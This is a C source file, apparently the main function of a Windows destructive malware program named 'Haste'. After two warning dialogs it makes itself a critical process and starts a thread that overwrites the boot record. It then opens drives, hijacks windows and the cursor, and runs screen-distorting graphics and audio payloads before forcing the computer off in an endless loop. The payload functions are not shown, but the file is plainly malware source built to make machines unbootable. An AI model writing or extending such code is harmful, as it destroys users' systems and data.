#include "haste.h"

INT WINAPI wWinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	PWSTR pszCmdLine,
	INT nShowCmd
) 
{
	UNREFERENCED_PARAMETER(hInstance);
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(pszCmdLine);
	UNREFERENCED_PARAMETER(nShowCmd);

	if (MessageBoxW(NULL, L"This malware will destroy your computer.\nDo you want to run this?", L"Haste - 1/2", MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES)
		ExitProcess(0);

	if (MessageBoxW(NULL, L"If you know what this does and still willing to run this, You may click Yes.\nOtherwise you want a PC, click No and delete the malware.", L"Haste - 2/2", MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES)
		ExitProcess(0);

	CreateMutexW(NULL, TRUE, L"Haste");

	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		ForcePoweroffComputer();
		return FALSE;
	}

	SetProcessAsCriticalProcess();
	CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)OverwriteBootRecord, NULL, 0, NULL));
	Sleep(5000);

	OpenRandomDrives();
	CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MoveWindowThread, NULL, 0, NULL));
	CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)CursorMoveThread, NULL, 0, NULL));

	HANDLE hGdiHeapPayload1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, 8192 * 64, 0);
	HANDLE hGdiPayload1 = CreateThread(NULL, 0, &GdiPayload1, hGdiHeapPayload1, 0, NULL);
	AudioSequence1();
	Sleep(20000);

	EndGdiPayload(hGdiPayload1, hGdiHeapPayload1);

	HANDLE hGdiHeapPayload2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, 8192 * 64, 0);
	HANDLE hGdiPayload2 = CreateThread(NULL, 0, &GdiPayload2, hGdiHeapPayload2, 0, NULL);
	AudioSequence2();
	Sleep(20000);

	EndGdiPayload(hGdiPayload2, hGdiHeapPayload2);

	HANDLE hGdiHeapPayload3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, 8192 * 64, 0);
	HANDLE hGdiPayload3 = CreateThread(NULL, 0, &GdiPayload3, hGdiHeapPayload3, 0, NULL);

	HANDLE hPostGdiHeapPayload3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, 8192 * 64, 0);
	HANDLE hPostGdiPayload3 = CreateThread(NULL, 0, &PostGdiPayload3, hPostGdiHeapPayload3, 0, NULL);
	AudioSequence3();
	Sleep(30000);

	EndGdiPayload(hGdiPayload3, hGdiHeapPayload3);

	HANDLE hGdiHeapPayload4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, 8192 * 64, 0);
	HANDLE hGdiPayload4 = CreateThread(NULL, 0, &GdiPayload4, hGdiHeapPayload4, 0, NULL);
	AudioSequence4();
	Sleep(20000);

	EndGdiPayload(hGdiPayload4, hGdiHeapPayload4);
	EndGdiPayload(hPostGdiPayload3, hPostGdiHeapPayload3);

	HANDLE hGdiPayload5 = CreateThread(NULL, 0, &FinalGdiPayload, NULL, 0, NULL);
	Sleep(2000);

	while (TRUE) {
		ForcePoweroffComputer();
	}
}